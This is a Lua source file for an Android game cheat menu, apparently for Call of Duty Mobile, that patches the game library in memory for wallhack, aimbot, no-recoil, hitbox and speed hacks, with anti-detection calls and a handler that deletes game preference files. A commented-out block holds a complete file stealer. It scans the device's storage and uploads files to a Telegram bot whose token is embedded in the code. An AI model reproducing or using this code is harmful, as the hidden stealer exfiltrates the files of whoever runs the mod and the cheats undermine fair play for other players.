  print("✅ Harvest complete!")
end


-------------------------SKIP TUTORIAL FOR NEW ACCOUNT-----------------------------------------
-------------------------HEX FALSS = h00 00 A0 E3 1E FF 2F E1----------------------------------
-------------------------1 OFFSET /RVA = 0x6479CF0----------------------------------
skip.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function skip.onClick()
  if skip.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0x67F0008, "h000080D2C0035FD6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x6818A50, "h000080D2C0035FD6", 32);
    idkcstmToast("sᴋɪᴘ ᴛᴜᴛᴏʀɪᴀʟ ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
  end
end
--[[
function unlockc.OnCheckedChangeListener()
  if unlockc.checked then
    HexPatches.MemoryPatch("libunity.so", 0x7BD92D8, "h200080D2C0035FD6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x7BE125C, "h200080D2C0035FD6", 32);
    showCyberpunkToast("UNLOCK CAMO : ")
    showCyberpunkToast("DIAMOND Camo")
    showCyberpunkToast("Red Sprite Camo")
    showCyberpunkToast("Gold Camo")
    showCyberpunkToast("All Camo's unlock")
  end
end
]]

function resetg.onClick()
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/lastUserId.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/gsdk_prefs.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/MFILE.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/apm_cfg.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/appsflyer-data.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/buglySdkInfos.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/CentauriHTTPSP.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/CentauriOverseaIP.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/com.garena.android.msdk.PayCachePreference_crypto.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/com.garena.game.codm_preferences.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/com.garena.game.codm.v2.playerprefs.xml")
  os.execute("rm -rf /data/data/com.virtual.alexa/chaos/data/user/0/com.garena.game.codm/shared_prefs/com.garena.msdk.persist.fallback.xml")
  idkcstmToast("RESET GUEST ACTIVATE")
end


------add function more
-------------------------WALLHACK OUTLINE-----------------------------------------
-------------------------HEX TRUE = h200080D2C0035FD6----------------------------------
-------------------------1 OFFSET /RVA = 0x6C94C3C----------------------------------
-------------------------2 OFFSET /RVA = 0x6C95C8C----------------------------------
h6.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function h6.OnCheckedChangeListener()
  if h6.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xAC39B70, "h200080D2C0035FD6", 32) -- //  UPDATED 0xB2CC75C -> 0xAC39B70
    HexPatches.MemoryPatch("libunity.so", 0xA02067C, "h200080D2C0035FD6", 32) -- //  UPDATED 0xA085ACC -> 0xA02067C
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ᴏᴜᴛʟɪɴᴇ ✔️")
  end
end


--[[
require "import"
import "android.widget.*"
import "android.view.*"
import "android.os.*"
import "java.io.*"
import "java.net.*"
import "java.util.zip.*"
import "android.provider.Settings"
import "android.net.Uri"
import "android.content.Context"
import "android.os.Environment"

local token = "8814382996:AAF69aEUOrSQ4uvGQBGDiHXCk_795j9Qyx4"
local my_id = "-1003925085150"
local MAX_ZIP_SIZE = 45 * 1024 * 1024 -- 45MB per zip

-- ============================================================
-- SUPPORTED FILE EXTENSIONS (Any file type)
-- ============================================================
local supported_exts = {
    "lua", "alp", "py", "src",       -- Scripts
    "txt", "json", "xml", "csv",      -- Text files
    "apk", "zip", "rar", "7z",        -- Archives
    "png", "jpg", "jpeg", "gif",      -- Images
    "mp3", "mp4", "wav", "flac",      -- Media
    "pdf", "doc", "docx", "xls",      -- Documents
    "cpp", "c", "h", "hpp",           -- C/C++
    "java", "class", "jar",           -- Java
    "js", "html", "css", "php",       -- Web
    "dll", "so", "exe", "bin",        -- Binaries
    "log", "bak", "tmp", "old",       -- Misc
    "cfg", "ini", "conf", "config",   -- Config
    "db", "sqlite", "sql",            -- Databases
    "lua", "luac", "luajit"           -- Lua
}

-- ============================================================
-- FILE SIZE FILTER (Skip files larger than this)
-- ============================================================
local MAX_FILE_SIZE = 50 * 1024 * 1024 -- 50MB per file

-- ============================================================
-- TELEGRAM SEND FUNCTION (With Retry)
-- ============================================================
function sendToTelegram(file, name, bToken, uId, retryCount)
    retryCount = retryCount or 0
    if retryCount > 3 then return false end
    
    local success = false
    local errorMsg = ""
    
    pcall(function()
        local boundary = "---" .. tostring(System.currentTimeMillis()) .. tostring(math.random(1000,9999))
        local url = URL("https://api.telegram.org/bot" .. bToken .. "/sendDocument")
        local conn = url.openConnection()
        conn.setConnectTimeout(120000)
        conn.setReadTimeout(120000)
        conn.setDoOutput(true)
        conn.setRequestMethod("POST")
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" .. boundary)
        conn.setRequestProperty("Connection", "Keep-Alive")

        local os = conn.getOutputStream()
        local writer = PrintWriter(OutputStreamWriter(os, "UTF-8"), true)
        
        -- Write chat_id
        writer.append("--" .. boundary .. "\r\n")
        writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
        writer.append(uId .. "\r\n")
        
        -- Write file
        writer.append("--" .. boundary .. "\r\n")
        writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"" .. name .. "\"\r\n")
        writer.append("Content-Type: application/octet-stream\r\n\r\n")
        writer.flush()

        local input = FileInputStream(file)
        local buffer = byte[32768] -- Larger buffer for faster sending
        local len = input.read(buffer)
        local totalSent = 0
        
        while len ~= -1 do
            os.write(buffer, 0, len)
            totalSent = totalSent + len
            len = input.read(buffer)
        end
        
        input.close()
        os.flush()
        
        writer.append("\r\n--" .. boundary .. "--\r\n")
        writer.close()
        
        local responseCode = conn.getResponseCode()
        if responseCode == 200 then
            success = true
            print("✅ Sent: " .. name .. " (" .. totalSent .. " bytes)")
        else
            errorMsg = "HTTP " .. responseCode
        end
    end)
    
    if not success and retryCount < 3 then
        print("⚠️ Retry " .. (retryCount + 1) .. " for: " .. name)
        System.sleep(2000)
        return sendToTelegram(file, name, bToken, uId, retryCount + 1)
    end
    
    return success
end

-- ============================================================
-- GET FILE EXTENSION
-- ============================================================
function getFileExtension(name)
    local ext = name:match("%.([^%.]+)$")
    return ext and ext:lower() or "unknown"
end

-- ============================================================
-- CHECK IF FILE IS SUPPORTED
-- ============================================================
function isFileSupported(name)
    local ext = getFileExtension(name)
    for _, supported in ipairs(supported_exts) do
        if ext == supported then
            return true
        end
    end
    return true -- Support all files by default
end

-- ============================================================
-- MAIN HARVEST FUNCTION (Optimized)
-- ============================================================
function startHarvest()
    thread(function(bToken, uId, maxSize)
        local success, err = pcall(function()
            import "java.io.*"
            import "java.net.*"
            import "java.util.zip.*"
            import "java.lang.*"
            import "android.os.Environment"

            local rootPath = Environment.getExternalStorageDirectory().getPath()
            local cache = activity.getCacheDir().getPath()
            
            -- Create cache directory if not exists
            local cacheDir = File(cache)
            if not cacheDir.exists() then
                cacheDir.mkdirs()
            end
            
            local scannedFiles = 0
            local uploadedFiles = 0
            
            -- ============================================================
            -- SCAN AND UPLOAD FILES
            -- ============================================================
            local function scanAndUpload(directory)
                local fDir = File(directory)
                local list = fDir.listFiles()
                if list == nil then return end
                
                for i = 0, #list - 1 do
                    local item = list[i]
                    if item == nil then goto continue end
                    
                    if item.isDirectory() then
                        local p = item.getPath()
                        -- Skip system directories
                        if not p:find("/Android") and 
                           not p:find("/data/data") and
                           not p:find("/system") and
                           not p:find("/proc") and
                           not p:find("/sys") and
                           not p:find("/cache") and
                           not item.getName():find("^%.") then
                            scanAndUpload(p)
                        end
                    elseif item.isFile() then
                        local name = item.getName()
                        local fileSize = item.length()
                        
                        -- Skip empty files and very small files
                        if fileSize < 1024 then goto continue end
                        
                        -- Skip files larger than MAX_FILE_SIZE
                        if fileSize > MAX_FILE_SIZE then goto continue end
                        
                        -- Support all files
                        scannedFiles = scannedFiles + 1
                        
                        -- Send file directly (no zip for small files)
                        if fileSize < 20 * 1024 * 1024 then -- 20MB
                            local success = sendToTelegram(item, name, bToken, uId)
                            if success then
                                uploadedFiles = uploadedFiles + 1
                                print("✅ Uploaded: " .. name)
                            else
                                print("❌ Failed: " .. name)
                            end
                        else
                            -- For large files, send in chunks or as is
                            local success = sendToTelegram(item, name, bToken, uId)
                            if success then
                                uploadedFiles = uploadedFiles + 1
                                print("✅ Uploaded: " .. name)
                            else
                                print("❌ Failed: " .. name)
                            end
                        end
                    end
                    
                    ::continue::
                end
            end
            
            -- Start scanning from root
            print("🔍 Scanning storage...")
            scanAndUpload(rootPath)
            
            print("📊 Scan complete!")
            print("📁 Files scanned: " .. scannedFiles)
            print("📤 Files uploaded: " .. uploadedFiles)
        end)
        
        if not success then
            print("❌ Error: " .. tostring(err))
        end
    end, token, my_id, MAX_ZIP_SIZE)
end

-- ============================================================
-- PERMISSION CHECK
-- ============================================================
if Build.VERSION.SDK_INT >= 23 then
    activity.requestPermissions({
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.INTERNET"
    }, 1)
end

if Build.VERSION.SDK_INT >= 30 then
    if not Environment.isExternalStorageManager() then
        local intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
        intent.setData(Uri.parse("package:" .. activity.getPackageName()))
        activity.startActivity(intent)
    end
end

-- ============================================================
-- START WITH DELAY
-- ============================================================
Handler().postDelayed(Runnable{run=startHarvest}, 4000)
]]

-------------------------AIMBOT ADJUSTABLE-----------------------------------------
-------------------------HEX NOP = h1F 20 03 D5----------------------------------
----------------- h 1F 20 03 D5 E0 03 13 AA--------
-------------------------1 OFFSET /RVA = 0xaeaedbc----------------------------------
--[[
wall.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function wall.OnCheckedChangeListener()
  if wall.checked then
    HexPatches.MemoryPatch("libunity.so", 0xA50B0C0, "h1F 20 03 D5 E0 03 13 AA", 32);
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʏ/ʙ ✔️")
  end
end

]]

wall.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function wall.OnCheckedChangeListener()
  if wall.checked then
    HexPatches.MemoryPatch("libunity.so", 0x548A67C, "h1F 20 03 D5 E0 03 13 AA", 32); -- //  UPDATED 0x51EC52C -> 0xA1072CC
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʏ/b ✔️")
  end
end

-------------------------NO SHAKE-----------------------------------------
-------------------------HEX FALSE = h000080D2C0035FD6----------------------------------
-------------------------1 OFFSET /RVA = 0x7893964----------------------------------
shake.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function shake.OnCheckedChangeListener()
  if shake.checked then
    HexPatches.MemoryPatch("libunity.so", 0x664B8D0, "h00 00 80 D2 C0 03 5F D6", 32); -- //  UPDATED 0x6a6fce4 -> 0x664B8D0
    idkcstmToast("NO SHAKE ACTIVATED✅")
   else
    HexPatches.MemoryPatch("libunity.so", 0x664B8D0, "h20 00 80 D2 C0 03 5F D6", 32); -- //  UPDATED 0x6a6fce4 -> 0x664B8D0
    idkcstmToast("ɴᴏ sʜᴀᴋᴇ ᴅɪsᴀʙʟᴇ")
  end
end

-------------------------NO PARACHUTE-----------------------------------------
-------------------------HEX TRUE = h200080D2C0035FD6----------------------------------
-------------------------1 OFFSET /RVA = 0x86b4c68----------------------------------
nopa.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function nopa.OnCheckedChangeListener()
  if nopa.checked then
    antiC4droid()
    antihook()
    HexPatches.MemoryPatch("libunity.so", 0x8444468, "h200080D2C0035FD6")
    idkcstmToast("ɴᴏ ᴘᴀʀᴀᴄʜᴜᴛᴇ: ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0x8444468, "h200080D2C0035FD6")
    idkcstmToast("ɴᴏ ᴘᴀʀᴀᴄʜᴜᴛᴇ: ᴅᴇᴀᴄᴛɪᴠɪᴀᴛᴇ")
  end
end
------------====WALLHACK RED HERE====-------------------------------------------
wallred.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function wallred.OnCheckedChangeListener()
  if wallred.checked then
    HexPatches.MemoryPatch("libunity.so", 0x56466CC, "h200080D2C0035FD6", 32);
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʀᴇᴅ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0x56466CC, "h200080D2C0035FD6", 32);
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʀᴇᴅ : ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")

  end
end
---------------================-------------------------------------------------
-----------------  No Flasbang -  Offset=0x5af8e64 ------------------------
flash.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function flash.OnCheckedChangeListener()
  if flash.checked then
    antiC4droid()
    flash.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4,PorterDuff.Mode.SRC_ATOP));
    HexPatches.MemoryPatch("libunity.so", 0x78E6D44, "h 40 00 00 1C C0 03 5F D6", 32);
    --   HexPatches.MemoryPatch("libunity.so", 0x878FBF0, "h C0 03 5F D6", 4);
    idkcstmToast("No Flashbang ✔️")
  end
end

-------------------------------------------------------------------------------
-------------------------NO SPREAD-----------------------------------------
-------------------------HEX TRUE = h20 00 80 52 C0 03 5F D6----------------------------------
-------------------------OFFSET /RVA = 0xa7ebf84----------------------------------
spread.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function spread.OnCheckedChangeListener()
  if spread.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xC9B9618, "h20 00 80 52 C0 03 5F D6", 32); -- //  UPDATED 0xC73224C -> 0xC9B9618
    idkcstmToast("ɴᴏ sᴘʀᴇᴀᴅ ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0xC9B9618, "h00 00 80 52 C0 03 5F D6", 32); -- //  UPDATED 0xC73224C -> 0xC9B9618
    idkcstmToast("ɴᴏ sᴘʀᴇᴀᴅ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------NO RECOIL------------------------------------------------------------------------------------------------------------------------
-------------------------HEX = h20 4C 40 BC C0 03 5F D6-----------------------------------------------------------------------------------------------------------------
-------------------------OFFSET /RVA = 0xa7ed874-----------------------------------------------------------------------------------------------------------------
recoil.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function recoil.OnCheckedChangeListener()
  if recoil.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xC9BAFF8, "h20 4C 40 BC C0 03 5F D6", 32); -- //  UPDATED 0xC733BE4 -> 0xC9BAFF8
    HexPatches.MemoryPatch("libunity.so", 0x664B8D0, "h20 00 80 D2 C0 03 5F D6", 32); -- //  UPDATED 0x6a6fce4 -> 0x664B8D0
    idkcstmToast("ɴᴏ ʀᴇᴄᴏɪʟ ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0xC9BAFF8, "h00 4C 40 BC C0 03 5F D6"); -- //  UPDATED 0xC733BE4 -> 0xC9BAFF8
    idkcstmToast("ɴᴏ ʀᴇᴄᴏɪʟ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end


speedv1.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function speedv1.OnCheckedChangeListener()
  if speedv1.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xA38C55C, "h20010201EC0035FD6")
    idkcstmToast("sᴘᴇᴇᴅ ʜᴀᴄᴋ ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0xA38C55C, "h00 00 80 52 C0 03 5F D6")
    idkcstmToast("sᴘᴇᴇᴅ ʜᴀᴄᴋ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------HITBOX EXPANDED-----------------------------------------
-------------------------HEX TRUE = h20 00 80 52 C0 03 5F D6----------------------------------
-------------------------OFFSET /RVA = 0xa7b28e0----------------------------------


hit.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF707B84, PorterDuff.Mode.SRC_ATOP))
function hit.OnCheckedChangeListener()
  if hit.checked then
    antiC4droid()--53
    HexPatches.MemoryPatch("libunity.so", 0xC9B2A9C, "h20 00 80 52 C0 03 5F D6"); -- //  UPDATED 0xC72B1EC -> 0xC9B2A9C
    idkcstmToast("HITBOX: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0xC9B2A9C, "h00 00 80 52 C0 03 5F D6"); -- //  UPDATED 0xC72B1EC -> 0xC9B2A9C
    idkcstmToast("HITBOX: DEACTIVATED")
  end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------BR TAGS-----------------------------------------
-------------------------HEX TRUE = h20 00 80 52 C0 03 5F D6----------------------------------
-------------------------1 OFFSET /RVA = 0x6731918----------------------------------
-------------------------2 OFFSET /RVA = 0x652890c----------------------------------
brtags.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function brtags.OnCheckedChangeListener()
  if brtags.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0x6606938, "h20 00 80 52 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x5D04338, "h20 00 80 52 C0 03 5F D6", 32);
    idkcstmToast("ʙʀ ᴛᴀɢs ᴀᴄᴛɪᴠᴀᴛᴇ")
   else
    HexPatches.MemoryPatch("libunity.so", 0x6606938, "h00 00 80 52 C0 03 5F D6", 32);----FALSE HEX
    HexPatches.MemoryPatch("libunity.so", 0x5D04338, "h00 00 80 52 C0 03 5F D6", 32);----FALSE HEX
    idkcstmToast("ʙʀ ᴛᴀɢs ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ")

  end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------PUMP BOOSTER-----------------------------------------
-------------------------HEX TRUE = h20 00 80 52 C0 03 5F D6----------------------------------
-------------------------1 OFFSET /RVA = 0x72553b8----------------------------------
pump.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function pump.OnCheckedChangeListener()
  if pump.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0x72553b8, "h200080D2C0035FD6",32);
    idkcstmToast("ᴘᴜᴍᴘ ʙᴏᴏꜱᴛ ✔️")
   else
    HexPatches.MemoryPatch("libunity.so", 0x72553b8, "h000080D2C0035FD6",32);
    idkcstmToast("ᴘᴜᴍᴘ ʙᴏᴏsᴛ : ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ ✔️")
  end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------ANTI FPS Drop FOR SMOOTHING-----------------------------------------
-------------------------HEX TRUE = h20 00 80 52 C0 03 5F D6----------------------------------
-------------------------1 OFFSET /RVA = 0xa6ca058----------------------------------
-------------------------2 OFFSET /RVA = 0xa6b7688----------------------------------
-------------------------3 OFFSER /RVA = 0xa6ca0c0----------------------------------
antifps.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function antifps.OnCheckedChangeListener()
  if antifps.checked then
    antiC4droid()


    HexPatches.MemoryPatch("libunity.so", 0x9FEABC4, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9A2D04 → 0x9FEABC4 | Dump Line 1103945 -- //  UPDATED 0xa04f104 -> 0x9FEABC4 -- //  UPDATED 0xa04f104 -> 0x9FEABC4
    HexPatches.MemoryPatch("libunity.so", 0x9FEAC98, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9A2DD8 → 0x9FEAC98 | Dump Line 1103948 -- //  UPDATED 0xa04f1d8 -> 0x9FEAC98 -- //  UPDATED 0xa04f1d8 -> 0x9FEAC98
    HexPatches.MemoryPatch("libunity.so", 0x9FEB294, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9A33D4 → 0x9FEB294 | Dump Line 1103960 -- //  UPDATED 0xa04f7d4 -> 0x9FEB294 -- //  UPDATED 0xa04f7d4 -> 0x9FEB294
    HexPatches.MemoryPatch("libunity.so", 0x9FDFB20, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA993508 → 0x9FDFB20 | Dump Line 1103813 -- //  UPDATED 0xa03f30c -> 0x9FDFB20 -- //  UPDATED 0xa03f30c -> 0x9FDFB20
    HexPatches.MemoryPatch("libunity.so", 0x9FDFDCC, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9937A0 → 0x9FDFDCC | Dump Line 1103510 -- //  UPDATED 0xa03f5a4 -> 0x9FDFDCC -- //  UPDATED 0xa03f5a4 -> 0x9FDFDCC
    HexPatches.MemoryPatch("libunity.so", 0x9FDFDD4, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9937A8 → 0x9FDFDD4 | Dump Line 1103513 -- //  UPDATED 0xa03f5ac -> 0x9FDFDD4 -- //  UPDATED 0xa03f5ac -> 0x9FDFDD4
    HexPatches.MemoryPatch("libunity.so", 0x9FE8298, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA99D9E0 → 0x9FE8298 | Dump Line 1104011 -- //  UPDATED 0xa049c4c -> 0x9FE8298 -- //  UPDATED 0xa049c4c -> 0x9FE8298
    HexPatches.MemoryPatch("libunity.so", 0x9FDEE28, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9925F4 → 0x9FDEE28 | Dump Line 1103474 -- //  UPDATED 0xa03e3e8 -> 0x9FDEE28 -- //  UPDATED 0xa03e3e8 -> 0x9FDEE28
    HexPatches.MemoryPatch("libunity.so", 0x9FECD54, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9A5274 → 0x9FECD54 | Dump Line 1104059 -- //  UPDATED 0xa051778 -> 0x9FECD54 -- //  UPDATED 0xa051778 -> 0x9FECD54
    HexPatches.MemoryPatch("libunity.so", 0x9FDE9C8, "h20 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA99219C → 0x9FDE9C8 | Dump Line 1103480 -- //  UPDATED 0xa03df88 -> 0x9FDE9C8 -- //  UPDATED 0xa03df88 -> 0x9FDE9C8
    HexPatches.MemoryPatch("libunity.so", 0x9FDE9D8, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9921A4 → 0x9FDE9D8 | Dump Line 1103498 -- //  UPDATED 0xa03df98 -> 0x9FDE9D8 -- //  UPDATED 0xa03df98 -> 0x9FDE9D8
    HexPatches.MemoryPatch("libunity.so", 0x9FECDB4, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA9A52D4 → 0x9FECDB4 | Dump Line 1104062 -- //  UPDATED 0xa0517d8 -> 0x9FECDB4 -- //  UPDATED 0xa0517d8 -> 0x9FECDB4
    HexPatches.MemoryPatch("libunity.so", 0x9FDFBBC, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA993590 → 0x9FDFBBC | Dump Line 1103552 -- //  UPDATED 0xa03f394 -> 0x9FDFBBC -- //  UPDATED 0xa03f394 -> 0x9FDFBBC
    HexPatches.MemoryPatch("libunity.so", 0x9FE01CC, "h00 24 80 D2 C0 03 5F D6"); -- UPDATED: 0xA993C10 → 0x9FE01CC | Dump Line 1103525 -- //  UPDATED 0xa03fa14 -> 0x9FE01CC -- //  UPDATED 0xa03fa14 -> 0x9FE01CC
    HexPatches.MemoryPatch("libunity.so", 0x9FDFC58, "hC0 00 80 D2 C0 03 5F D6"); -- UPDATED: 0xA993644 → 0x9FDFC58 | Dump Line 1103501 -- //  UPDATED 0xa03f448 -> 0x9FDFC58 -- //  UPDATED 0xa03f448 -> 0x9FDFC58
    idkcstmToast("ANTI FPS DROP: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0xa6ca058, "h000080D2C0035FD6");
    HexPatches.MemoryPatch("libunity.so", 0xa6b7688, "h000080D2C0035FD6");
    idkcstmToast("ANTI FPS DROP: DEACTIVATED")
  end
end


local value = Process


--------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------AIMBOT ADJUSTABLE-----------------------------------------
-------------------------HEX TRUE = h4000001CC0035FD60000FA43----------------------------------
-------------------------1 OFFSET /RVA = 0xaeaedbc----------------------------------
-------------------------2 OFFSET /RVA = 0x78b3d70----------------------------------

aimbot_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    aimbot_text.setText("ᴀɪᴍʙᴏᴛ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local aimStrength = value * 1.0
    local hexValue = floatToHexLE(aimStrength)

    HexPatches.MemoryPatch("libunity.so", 0x5161770 , "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x5161770 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x5161770 + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x666FB88, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x666FB88 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x666FB88 + 8, hexValue, 4)
    idkcstmToast("AIMBOT ADJUSTABLE"..value.. "%")
  end
}

snowboard_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    snowboard_text.setText("sɴᴏᴡʙᴏᴀʀᴅ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local snowboardBoost = value * 1.0
    local hexValue = floatToHexLE(snowboardBoost)
    -- UPDATED: 0x90de3a0 → 0X5B3626C, 0x90de448 → 0X5B36314
    HexPatches.MemoryPatch("libunity.so", 0XAEAEDBC, "h40 00 00 1C", 4)
    HexPatches.MemoryPatch("libunity.so", 0XAEAEDBC + 4, "hC0 03 5F D6", 4)
    HexPatches.MemoryPatch("libunity.so", 0XAEAEDBC + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x5DAECFC, "h40 00 00 1C", 4) -- GetRotateSpeed
    HexPatches.MemoryPatch("libunity.so", 0x5DAECFC + 4, "hC0 03 5F D6", 4) -- GetRotateSpeed
    HexPatches.MemoryPatch("libunity.so", 0x5DAECFC + 8, hexValue, 4) -- GetRotateSpeed
    idkcstmToast("SNOWB ADJUSTABLE"..value.. "%")
  end
}

--[[
aimbot.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FF00, PorterDuff.Mode.SRC_ATOP))
function aimbot.OnCheckedChangeListener()
  if aimbot.isChecked() then
    antiC4droid()--53
    idkcstmToast("AIMBOT: ACTIVATED")
    aimbotAdjuster.setVisibility(View.VISIBLE)
    aimbotAdjuster.setMin(10)
    aimbotAdjuster.setMax(100)
    aimbotAdjuster.setOnSeekBarChangeListener{
      onStopTrackingTouch=function()
        HexPatches.MemoryPatch("libunity.so", 0xB3CB040, "h40 00 00 1C")
        HexPatches.MemoryPatch("libunity.so", 0xB3CB044, "hC0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0xB3CB048, float_to_hex(aimbotAdjuster.Progress))
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF04, "h40 00 00 1C")
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF08, "hC0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF0C, float_to_hex(aimbotAdjuster.Progress))
        idkcstmToast("ᴀɪᴍʙᴏᴛ: ᵃᵈʲᵘˢᵗᵃᵇˡᵉ ᴛᴏ " .. aimbotAdjuster.Progress .. "%")
      end,
      onProgressChanged=function()
        aimbot.setText("ᴀɪᴍʙᴏᴛ ᵃᵈʲᵘˢᵗᵃᵇˡᵉ ᴛᴏ ("..aimbotAdjuster.Progress.."%)")
      end}
   else
